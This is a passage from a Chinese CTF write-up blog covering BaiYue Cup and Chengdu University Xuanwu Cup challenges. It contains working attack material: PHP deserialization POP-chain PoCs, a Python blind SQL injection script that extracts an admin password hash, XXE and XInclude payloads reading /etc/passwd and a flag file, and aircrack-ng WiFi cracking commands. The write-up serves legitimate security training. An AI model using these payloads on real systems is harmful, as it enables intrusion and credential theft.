class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i'</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'chal'</span>])) &#123;</span><br><span class="line">    $chal = unserialize($_GET[<span class="string">'chal'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从几个类的<code>魔术方法</code>来构造POP链：</p>
<p>① 很明显这道题目能够读取文件的函数是<code>Read::file_get()</code>方法中的<code>file_get_contents()</code>函数，而其又由<code>Read::__invoke()</code>魔术方法触发</p>
<p>② <code>__invoke</code>魔术方法触发的条件是：当尝试以调用<code>方法</code>的方式调用一个对象时。而我们发现本题中只有<code>Test::__get()</code>魔术方法的<code>return $func()</code>可以触发，只要<code>$func = new Read()</code>就可以，因为会等于<code>return Read()</code>，此时<code>Read</code>不只是类名，因为后面被加上<code>括号</code>，所以被当成了<code>方法</code>。 此时需要触发<code>Test::__get()</code>魔术方法 </p>
<p>③ <code>__get()</code>魔术方法触发的条件是：当访问类中的一个<code>不存在</code>属性时。我们发现<code>Show::__toString()</code>魔术方法中的语句：<code>$this-&gt;str[&#39;str&#39;]-&gt;source</code>，可以令<code>str[&#39;str&#39;] = new Test()</code>，而<code>source</code>是<code>Test</code>类中没有的属性。此时就需要触发<code>Show::_toString()</code>魔术方法，发现<code>Show::__wakeup()</code>魔术方法中的<code>preg_match()</code>函数有<code>$this-&gt;source</code>并且会将其当做字符串来匹配，所以此时只要<code>$this-&gt;source = new Show()</code>。</p>
<p>④ 而出发<code>Show::__wakeup()</code>魔术方法就是<code>unserialize()</code>函数</p>
<p>以此写 POC 生成反序列化字符串</p>
<p>Ps：① 这里的<code>$a-&gt;source = new Show();</code>不能写在<code>Show::_construct()</code>魔术方法中，不然会一直循环；② payload 需要<code>urlencode</code>的原因是<code>Read</code>类的<code>private $var</code>序列化后会有不可见字符，url 编码之后不容易出错</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $var;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;var = <span class="string">"/var/www/html/fllllllaaaaaag.php"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $source;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;str = <span class="keyword">array</span>(<span class="string">"str"</span>=&gt;<span class="keyword">new</span> Test());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $params;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;params = <span class="keyword">new</span> Read();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line"></span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a)).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/1-1.png" alt="1-1"></p>
<p>序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Show"</span>:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">6</span>:<span class="string">"source"</span>;O:<span class="number">4</span>:<span class="string">"Show"</span>:<span class="number">2</span>:&#123;</span><br><span class="line">		s:<span class="number">6</span>:<span class="string">"source"</span>;N;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">"str"</span>;a:<span class="number">1</span>:&#123;</span><br><span class="line">			s:<span class="number">3</span>:<span class="string">"str"</span>;O:<span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">1</span>:&#123;</span><br><span class="line">				s:<span class="number">6</span>:<span class="string">"params"</span>;O:<span class="number">4</span>:<span class="string">"Read"</span>:<span class="number">1</span>:&#123;</span><br><span class="line">					s:<span class="number">9</span>:<span class="string">"Readvar"</span>;s:<span class="number">32</span>:<span class="string">"/var/www/html/fllllllaaaaaag.php"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">"str"</span>;a:<span class="number">1</span>:&#123;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">"str"</span>;O:<span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">1</span>:&#123;</span><br><span class="line">			s:<span class="number">6</span>:<span class="string">"params"</span>;O:<span class="number">4</span>:<span class="string">"Read"</span>:<span class="number">1</span>:&#123;</span><br><span class="line">				s:<span class="number">9</span>:<span class="string">"Readvar"</span>;s:<span class="number">32</span>:<span class="string">"/var/www/html/fllllllaaaaaag.php"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿下 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/1-2.png" alt="1-2"></p>
<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>打开靶机，有一个登录和注册功能，源代码中有提示：</p>
<blockquote>
<p>\<!-- if you need hash tools, location: tools.php --> </p>
</blockquote>
<p>访问tools.php，页面要求提交一个md5值： </p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-1.png" alt="2-1"></p>
<p>但是提交一个1的md5值，返回无结果</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-2.png" alt="2-2"></p>
<p>暂时不知道怎么利用，只能去看看登录注册功能 </p>
<p>注册发现<strong>admin</strong>用户存在，注册其他用户登录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-3.png" alt="2-3"></p>
<p>发现跳转到了<strong>manage.php</strong>，<strong>action</strong>参数测试发现无文件包含点，点进去<strong>here is your flag</strong></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-4.png" alt="2-4"></p>
<p>给了一个假flag，又看起来像是md5值，拿进去tools.php里面查询也没有返回结果 </p>
<p>然后就是<strong>msgid</strong>疑似注入点，但是除了1以外其他都没有返回结果 </p>
<p>目光回到注册登录功能上，先尝试了一下<strong>约束攻击</strong>，发现注册 admin 1 ，在登陆以后，成功登录admin</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-5.png" alt="2-5"></p>
<p>但是，点进here is your flag里面还是没有flflag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-6.png" alt="2-6"></p>
<p>这里有两个here is your flag，估计是因为除了我们注册的admin(空格)外，另外还有一个原本admin的 </p>
<p>并且发现，当注册一个带有单引号的 admin’ ，会被转义，并且没有显示出<strong>here is your flag</strong>的链接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-7.png" alt="2-7"></p>
<p>所以，猜测这里存在<strong>二次注入</strong>点，但是一直没试成功，直到放出了提示：<strong>二次注入测试引号逃逸</strong> </p>
<p>看到了<strong>引号逃逸</strong>，就直接想到了之前约束攻击，其实不是约束攻击，而是后台用了<strong>字符串截取</strong>，测试发现，最大长 </p>
<p>度为：<strong>30</strong> </p>
<p>逃逸过程如下：</p>
<p>重点是让传入的 username 有<code>反斜杠</code>，但没有<code>单引号</code>，下面会说原因</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注册：admin                        &apos; =&gt; 长度30</span><br><span class="line">经过转义处理：admin                        \&apos; =&gt; 长度31</span><br><span class="line">经过substr截取前30个字符：admin                        \ =&gt;长度30 =&gt;单引号逃逸</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-8.png" alt="2-8"></p>
<p>结合之前的<strong>here is your flag</strong>链接中的参数<strong>msgid</strong>，就猜测，注册后执行的查询语句： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username=&apos;&apos; and msgid=&apos;1&apos;;</span><br></pre></td></tr></table></figure>
<p>那么既然逃逸了username后面的单引号，就只能在<strong>msgid</strong>中执行注入，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?msgid= or 1#</span><br><span class="line">?msgid = or 0#</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-9.png" alt="2-9"></p>
<p>拼接后为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username=&apos;admin...\&apos; and msgid=&apos; or 0 #&apos;;</span><br></pre></td></tr></table></figure>
<p>因为前面传递了<code>反斜杠</code>，将原本的<code>单引号</code>注释掉，与后面的 msgid 的单引号闭合，才能用 or 进行盲注。这里如果多传入一个单引号也不行，因为会造成闭合，并且无法注释掉原本语句内的单引号</p>
<p>条件为真时有返回结果，为假时无返回</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-10.png" alt="2-10"></p>
<p>根据这个逻辑进行盲注，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">url1 = <span class="string">"http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php? action=register"</span></span><br><span class="line">url2 = <span class="string">"http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php?msgid="</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"admin                        '"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">"123"</span></span><br><span class="line">&#125;</span><br><span class="line">r1 = s.post(url1, data = data)</span><br><span class="line">database = <span class="string">""</span><span class="comment">#web3</span></span><br><span class="line">web3 table_name = <span class="string">"flags,users"</span></span><br><span class="line">column_name = <span class="string">"id,username,password"</span></span><br><span class="line">admin_password = <span class="string">""</span></span><br><span class="line"><span class="keyword">print</span> r1.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment">#payload = "%20or%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20 where%20table_name=0x7573657273)," + str(i) + ",1))=" + str(j) + "%23"</span></span><br><span class="line">		payload = <span class="string">"%20or%20ascii(substr((select%20group_concat(password)%20from%20users%20where%20username=0x61646 d696e),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"%23"</span></span><br><span class="line">		r2 = s.get(url2 + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"may be you need to be admin!"</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-11.png" alt="2-11"></p>
<p>注出admin的密码：<strong>251471f34244cb6cd61f6b64c63f7b1a</strong> </p>
<p>是md5，直接解密不了，这时候就想到了之前的<strong>tools.php</strong>，查询得到明文：<strong>ChunQiuGame</strong></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-12.png" alt="2-12"></p>
<p>登录admin后，跳转到 manage.php?action=admin ，提示我们POST content 参数进行xxe</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-13.png" alt="2-13"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-14.png" alt="2-14"></p>
<p>尝试直接引入外部实体读取文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-15.png" alt="2-15"></p>
<p>但是没有返回结果，从相应来看，也没有过滤掉什么关键字 </p>
<p>尝试无回显xxe，都失败了 </p>
<p>赛后得到的提示是：<strong>xinclude</strong> </p>
<p>参考：<a href="https://www.anquanke.com/post/id/156227#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227#h3-5</a> </p>
<p>里面提到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用 xinclude</span><br></pre></td></tr></table></figure>
<p>猜测后台的源码应该是这样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml); </span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-16.png" alt="2-16"></p>
<p>直接用传统引入外部实体的方法读取文件，是因为php的xml库的底层库是libxml2，而在2.6版本之后，改库已默 </p>
<p>认禁用外部实体引用的解析 </p>
<p>我们只有加入<strong>LIBXML_NOENT</strong> 选项，才能解析外部实体： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br></pre></td></tr></table></figure>
<p>而<strong>xinclude</strong>无需使用 LIBXML_NOENT 选项去开启默认关闭的外部实体引用 </p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-17.png" alt="2-17"></p>
<p>最后传入payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/2-18.png" alt="2-18"></p>
<h2 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h2><p>首先题目解压出来 2 个文件</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-1.png" alt="1"></p>
<p><code>Winhex</code>打开这个<code>102%</code>发现文件头很熟悉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">89 47 4E 50</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-2.png" alt="2"></p>
<p>就是<code>png图片文件头</code>的变形，将其修改回来。并且添加后缀就可以看到图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-3.png" alt="3"></p>
<p>将<code>ori.jpg</code>做成灰度图（可以用在线网站： <a href="http://grayscale.imageonline.co/cn/" target="_blank" rel="noopener">http://grayscale.imageonline.co/cn/</a> ）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-4.png" alt="4"></p>
<p>下载其<code>png</code>格式，这里命名为<code>ori_grey.png</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-5.png" alt="5"></p>
<p>然后用<code>PS</code>打开<code>102%.png</code>和<code>ori_gray.png</code>，然后复制 ori_gray.png 的图层到 102%.png 上</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-6.png" alt="6"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-7.png" alt="7"></p>
<p>然后来到 102%.png ，选择模式为<code>减去</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-8.png" alt></p>
<p>然后选择<code>色阶</code>，调到<code>最左边</code>，就可以看见二维码了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-9.png" alt></p>
<p>扫描二维码，得到一串字符串：<code>1tsEz_b14ndVV4t3rM4k</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-10.png" alt></p>
<p>然后<code>binwalk</code>那张 102%.png 图片，发现有压缩包，但是没那么简单，因为这个图片文件里一共有2个zip文件头（50 4B 03 04），但是前面的 zip 文件头被改成了<code>4B 50 03 04</code>，所以<code>foremost</code>只识别到后面那个，提取出来的不完整。正确做法是搜索 png 图片结尾（49 45 4E 44 AE 42 60 82），然后就会发现被修改的 zip 文件头，修改它并从那里提取出来，才能完整</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-15.png" alt></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-11.png" alt></p>
<p>解压需要密码，就用刚才二维码扫出来的字符串解密，得到2张图片</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-12.png" alt></p>
<p>然后用<code>Stegsolve</code>先打开其中一张图片，点击<code>Analyse -&gt; Image Combiner</code>选择第二张图片，就能看到 flag 的字样</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-13.png" alt></p>
<p>可以将模式调整为<code>SUB</code>，这样看的比较清晰一些（或者先保存下载，然后再次打开调整）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/百越杯/3-14.png" alt></p>
<p>打出来就是<code>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</code></p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>题目：<code>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9"</span></span><br><span class="line"></span><br><span class="line">print(base64.b64decode(s))</span><br></pre></td></tr></table></figure>
<p>拿到 flag ：<code>please submit: flag{hello_byb}</code></p>
<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>找到原题： <a href="https://blog.csdn.net/afu42832/article/details/101767856" target="_blank" rel="noopener">https://blog.csdn.net/afu42832/article/details/101767856</a></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rgb=[<span class="string">"2f"</span>,<span class="string">"3f"</span>,<span class="string">"24"</span>, <span class="string">"22"</span>,<span class="string">"2e"</span>,<span class="string">"13"</span>, <span class="string">"7f"</span>,<span class="string">"66"</span>,<span class="string">"24"</span>, <span class="string">"71"</span>,<span class="string">"36"</span>,<span class="string">"45"</span>, <span class="string">"7b"</span>,<span class="string">"7e"</span>,<span class="string">"27"</span>, <span class="string">"72"</span>,<span class="string">"33"</span>,<span class="string">"10"</span>, <span class="string">"64"</span>,<span class="string">"67"</span>,<span class="string">"21"</span>, <span class="string">"76"</span>,<span class="string">"67"</span>,<span class="string">"0c"</span>, <span class="string">"70"</span>,<span class="string">"37"</span>,<span class="string">"23"</span>, <span class="string">"72"</span>,<span class="string">"78"</span>,<span class="string">"16"</span>, <span class="string">"7a"</span>,<span class="string">"60"</span>,<span class="string">"20"</span>, <span class="string">"21"</span>,<span class="string">"33"</span>,<span class="string">"45"</span>, <span class="string">"7b"</span>,<span class="string">"32"</span>,<span class="string">"77"</span>, <span class="string">"74"</span>,<span class="string">"37"</span>,<span class="string">"5c"</span>]</span><br><span class="line">key=<span class="string">"ISEEU!"</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rgb:</span><br><span class="line">        print(chr(int(i,<span class="number">16</span>)^ord(key[j])),end=<span class="string">''</span>)</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">        j%=<span class="number">6</span></span><br></pre></td></tr></table></figure>
<p>拿到 flag ：<code>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</code></p>
<h2 id="WireLess"><a href="#WireLess" class="headerlink" title="WireLess"></a>WireLess</h2><p>wifi密码破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 8 8 -t 6666%%%% &gt;&gt; pass.txt</span><br><span class="line"></span><br><span class="line">aircrack-ng -w pass.txt WiFi.pcap</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/" target="_blank" rel="noopener">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/</a></p>
<h1 id="成都大学第二届玄武杯"><a href="#成都大学第二届玄武杯" class="headerlink" title="成都大学第二届玄武杯"></a>成都大学第二届玄武杯</h1><p>比赛面向他们校的新生，所以都是基础题，做了就蛮写一下</p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/6-1.png" alt="6-1"></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/7-1.png" alt="7-1"></p>
<h2 id="WeekPassword"><a href="#WeekPassword" class="headerlink" title="WeekPassword"></a>WeekPassword</h2><blockquote>
<p>弱口令爆破</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/1-1.png" alt="1-1"></p>
<p>根据题目提示<code>weekpassword</code>，直接<code>top100</code>爆破，拿下 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/1-2.png" alt="1-2"></p>
<h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><blockquote>
<p>反序列化</p>
</blockquote>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $a = <span class="string">'nothing'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a != <span class="string">'nothing'</span>) &#123;</span><br><span class="line"></span><br><span class="line">            highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'No Flag!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要<code>$a</code>不等于<code>nothing</code>就可以直接拿 flag，POC如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $a;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;a = <span class="string">"anything"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将序列化字符串经过<code>urlencode()</code>是因为<code>private</code>属性会有不可见字符，编码后可用</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/2-1.png" alt="2-1"></p>
<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-1.png" alt="3-1"></p>
<p>没有其他发现，还下载图片查看。最后扫目录，发现<code>robots.txt</code></p>
